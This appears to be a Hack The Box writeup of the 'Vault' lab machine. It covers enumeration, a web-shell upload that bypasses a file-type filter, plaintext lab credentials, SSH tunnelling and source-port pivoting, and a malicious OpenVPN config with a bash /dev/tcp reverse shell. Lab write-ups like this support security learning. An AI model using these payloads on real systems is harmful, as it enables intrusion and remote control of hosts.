+++
date = '2025-02-24T22:28:29-05:00'
draft = false
title = 'HtB Vault'
tags = ['writeups','hack the box','medium','linux']
hideToc = false
+++
![HtB-Vault](/images/Vault.png)

Vault is medium to hard difficulty machine, which requires bypassing host and file upload restrictions, tunneling, creating malicious OpenVPN configuration files and PGP decryption.

<!--more-->
---

## Scanning

### nmap

```sh
┌──(pl4stic㉿kali)-[~/htb/vault]
└─$ nmap -T4 -p- -A 10.129.121.48 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-24 14:52 EST
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP - 80/tcp

![vault1](/images/vault1.png)

Attempts at directory fuzzing were not helpful. However, the `index.php` page indicates a client: "Sparklays" that might be a good guess for directory enumeration.  Going to `/sparklays` indicates we might be on the right track, as we get a "Forbidden" as opposed to "Not Found".  Let's try fuzzing in the `/sparklays/` directory.

![vault2](/images/vault2.png)

```sh
┌──(pl4stic㉿kali)-[~/htb/vault]
└─$ gobuster dir -u http://10.129.121.48/sparklays/ -w /usr/share/wordlists/dirb/big.txt -x .php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.121.48/sparklays/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin.php            (Status: 200) [Size: 615]
/design               (Status: 301) [Size: 325] [--> http://10.129.121.48/sparklays/design/]
/login.php            (Status: 200) [Size: 16]
Progress: 40938 / 40940 (100.00%)
===============================================================
Finished
===============================================================
```

```sh
┌──(pl4stic㉿kali)-[~/htb/vault]
└─$ gobuster dir -u http://10.129.121.48/sparklays/design/ -w /usr/share/wordlists/dirb/big.txt -x .php,.html  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.121.48/sparklays/design/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/design.html          (Status: 200) [Size: 72]
/uploads              (Status: 301) [Size: 333] [--> http://10.129.121.48/sparklays/design/uploads/]
Progress: 61407 / 61410 (100.00%)
===============================================================
Finished
===============================================================
```

Awesome, looks like we have something we can work with... the `/sparklays/admin.php` and `/sparklays/design/design.html` endpoints look like a good start point.

![vault3](/images/vault3.png)

![vault4](/images/vault4.png)

## Initial Access

### File Upload: /sparklays/design/changelogo.php

Let's try and upload a web shell and see what happens.

![vault5](/images/vault5.png)

Let's try all the different methods to bypass this filetype check.
1. Intercepting the request and changing the MIME type: **Nope**
2. Change the filetype: **Bingo!**
In this instance, we had success with a `.php5` extension.

![vault6](/images/vault6.png)

Now navigate to your file at `http://10.129.121.48/sparklays/design/uploads/shell.php5` and make sure you have your listener running. Enjoy your shell!

```sh
┌──(pl4stic㉿kali)-[~/htb/vault]
└─$ nc -nvlp 4444 
listening on [any] 4444 ...
connect to [10.10.14.142] from (UNKNOWN) [10.129.121.48] 36478
Linux ubuntu 4.13.0-45-generic #50~16.04.1-Ubuntu SMP Wed May 30 11:18:27 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 12:33:27 up 43 min,  0 users,  load average: 0.01, 0.01, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can\'t access tty; job control turned off
$ whoami
www-data
```

## Shell as www-data

Doing some filesystem enumeration, we find that we have access to `dave`'s home folder, and some interesting files within.

```sh
www-data@ubuntu:/home/dave/Desktop$ ls -al
ls -al
total 20
drwxr-xr-x  2 dave dave 4096 Jun  2  2021 .
drwxr-xr-x 18 dave dave 4096 Jun  2  2021 ..
-rw-rw-r--  1 alex alex   74 Jul 17  2018 Servers
-rw-rw-r--  1 alex alex   14 Jul 17  2018 key
-rw-rw-r--  1 alex alex   20 Jul 17  2018 ssh
www-data@ubuntu:/home/dave/Desktop$ cat Servers
cat Servers
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
www-data@ubuntu:/home/dave/Desktop$ cat key
cat key
itscominghome
www-data@ubuntu:/home/dave/Desktop$ cat ssh
cat ssh
dave
Dav3therav3123
```

Going off the filename `ssh`, let's try an SSH connection as `dave:Dav3therav3123`

## Shell as dave

### Network #2

As I was enumerating this machine, noticed a separate ethernet adaptor and totally different IP. It just so happened to line up with the network `DNS + Configurator` and `Firewall` were on, based on the documents on Dave's desktop: `192.168.122.0/24`.  We should explore this other network.

```sh
dave@ubuntu:~$ ifconfig
ens192    Link encap:Ethernet  HWaddr 00:50:56:b0:6f:cb  
          inet addr:10.129.121.48  Bcast:10.129.255.255  Mask:255.255.0.0
          inet6 addr: fe80::250:56ff:feb0:6fcb/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:feb0:6fcb/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:741357 errors:0 dropped:0 overruns:0 frame:0
          TX packets:684399 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:110262678 (110.2 MB)  TX bytes:308938643 (308.9 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:713 errors:0 dropped:0 overruns:0 frame:0
          TX packets:713 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:64705 (64.7 KB)  TX bytes:64705 (64.7 KB)

virbr0    Link encap:Ethernet  HWaddr fe:54:00:17:ab:49  
          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:34 errors:0 dropped:0 overruns:0 frame:0
          TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:2296 (2.2 KB)  TX bytes:1131 (1.1 KB)
[...snip...]
```

```sh
dave@ubuntu:~$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:5902          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 192.168.122.1:38330     192.168.122.4:80        TIME_WAIT   timewait (23.44/0/0)
tcp        0      0 10.129.121.48:22        10.10.14.142:40752      ESTABLISHED keepalive (6673.84/0/0)
tcp        0    216 10.129.121.48:22        10.10.14.142:47562      ESTABLISHED on (0.05/0/0)
```

We can also see a connection between this machine and the `DNS + Configurator` machine on `192.168.122.4:80`. A web server perhaps? Let's do a little more digging before checking that out. I'll transfer a standalone binary of `nmap` to the target machine and do some scans.

```sh
dave@ubuntu:~$ ./nmap -T4 192.168.122.4

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-02-24 16:59 PST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.122.4
Host is up (0.0037s latency).
Not shown: 1203 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Since `curl` isn't installed, did a quick `wget` on the main page of `http://192.168.122.4/`.

```sh
dave@ubuntu:~$ cat index.html
<h1> Welcome to the Sparklays DNS Server </h1>
<p>
<a href="dns-config.php">Click here to modify your DNS Settings</a><br>
<a href="vpnconfig.php">Click here to test your VPN Configuration</a>
```

### Web Server on 192.168.122.4

Let's use a local port forward via SSH to see if we can access that web server.

```sh
┌──(pl4stic㉿kali)-[~/htb/vault]
└─$ ssh -L 4545:192.168.122.4:80 dave@10.129.121.48
```

![vault7](/images/vault7.png)

The link to modify DNS settings is broken, but the VPN configuration link works.

![vault8](/images/vault8.png)

So we can change the contents of the `.ovpn` file... but how to get a reverse shell? A very quick Google search led me to this very informative [article](https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da). Here's the general payload we need to deliver:

```Text
remote 192.168.122.1     // IP of host we can reach
dev tun                  // interface name to use
nobind                   // because it says we have to
script-security 2 
up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/5555 0>&1'"
```

*Keep in mind, this will create a reverse shell back to the primary box, NOT our attacker machine.*

```sh
dave@ubuntu:~$ nc -nvlp 5555
Listening on [0.0.0.0] (family 0, port 5555)
Connection from [192.168.122.4] port 5555 [tcp/*] accepted (family 2, sport 47202)
bash: cannot set terminal process group (1100): Inappropriate ioctl for device
bash: no job control in this shell
root@DNS:/var/www/html#
```

Dave sure loves to save his passwords in his home directories.

```sh
root@DNS:/home/dave# cat ssh
cat ssh
dave
dav3gerous567
```

## Shell as root (DNS)

Let's use Dave's newly found password and connect via SSH from our other SSH shell. We're logged in as Dave, but can quickly regain root access with a `sudo su` and Dave's password again.

```sh
dave@ubuntu:~$ ssh dave@192.168.122.4
dave@192.168.122.4s password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

98 packages can be updated.
50 updates are security updates.


Last login: Mon Sep  3 16:38:03 2018
dave@DNS:~$ sudo su
[sudo] password for dave: 
root@DNS:/home/dave$
```

> Quick recap... we're currently in an SSH session as follows:
> `Attacker Box --SSH as dave--> Ubuntu (10.129.121.48) --SSH as dave--> DNS (192.168.122.4)`

### Enumeration

Not a whole lot of interesting information to be found by enumerating the filesystem... or so I thought. Once I got to the `auth.log`, I was reminded that we still didn't know our IP address for the `vault` server. Maybe we could find something in there? Sure enough, I found an IP that didn't make sense:

```sh
root@DNS:/var/log$ grep "COMMAND" auth.log -a | grep "192.168.5.2"
Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
```

### Clever Use of Source Port

Looking at the `auth.log` file and trying to recreate this connection, it seems port 987/tcp on 192.168.5.2 only responds when the source port is 4444/tcp.  Let me demonstrate:

```sh
root@DNS:/var/log$ nmap 192.168.5.2 -Pn -p 987

Starting Nmap 7.01 ( https://nmap.org ) at 2025-02-25 02:02 GMT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up.
PORT    STATE    SERVICE
987/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 2.08 seconds
root@DNS:/var/log$ nmap 192.168.5.2 -Pn -p 987 --source-port 4444

Starting Nmap 7.01 ( https://nmap.org ) at 2025-02-25 02:02 GMT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0024s latency).
PORT    STATE SERVICE
987/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
```

Okay, let's connect via `nc` as demonstrated in the `auth.log`

```sh
root@DNS:/var/log$ ncat -l 2222 --sh-exec "ncat -p 4444 192.168.5.2 987"
```

Now let's do our double SSH connection and get back on the DNS machine in a separate terminal. We should then be able to SSH to localhost on port 2222.  I tried the last password we got for Dave (`dav3gerous567`) and luckily, it worked.

```sh
dave@DNS:~$ ssh dave@localhost -p 2222
The authenticity of host '[localhost]:2222 ([::1]:2222)' cant be established.
ECDSA key fingerprint is SHA256:Wo70Zou+Hq5m/+G2vuKwUnJQ4Rwbzlqhq2e1JBdjEsg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[localhost]:2222' (ECDSA) to the list of known hosts.
dave@localhosts password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

96 packages can be updated.
49 updates are security updates.


Last login: Mon Sep  3 16:48:00 2018
dave@vault:~$ id
uid=1001(dave) gid=1001(dave) groups=1001(dave)
```

## Shell as dave (vault)

>Another recap... we're currently in an SSH session as follows:
> `Attacker Box --SSH as dave--> Ubuntu (10.129.121.48) --SSH as dave--> DNS (192.168.122.4) --SSH as dave--> vault (localhost:2222)`

### Decrypt root.txt.gpg

The quickest way to get `root.txt.gpg` back to our machine for decryption would be to base64 encode it, and simply copy and paste it.  Unfortunately, `base64` isn't installed... but `base32` is.

```sh
dave@vault:~$ base32 root.txt.gpg
QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHD
LIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJB
GMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55
AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRG
VEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOE
OPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFE
CKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3
AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJI
UWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTD
ZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ
6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36
G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE274
64GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBK
TTAX3UIRVNBQMYRI7XY=
```

Now copy and paste that string into a file on the `ubuntu` box, `encoded-file` in my case.

```sh
dave@ubuntu:~/Desktop$ base32 -d encoded-file > root.txt.gpg
```

Now, remember that file on Dave's desktop titled `key`... it's contents are `itscominghome`. Let's try it.

```sh
dave@ubuntu:~/Desktop$ gpg -d root.txt.gpg 

You need a passphrase to unlock the secret key for
user: "david <dave@david.com>"
4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)

gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
      "david <dave@david.com>"
ca46837********************fe819
```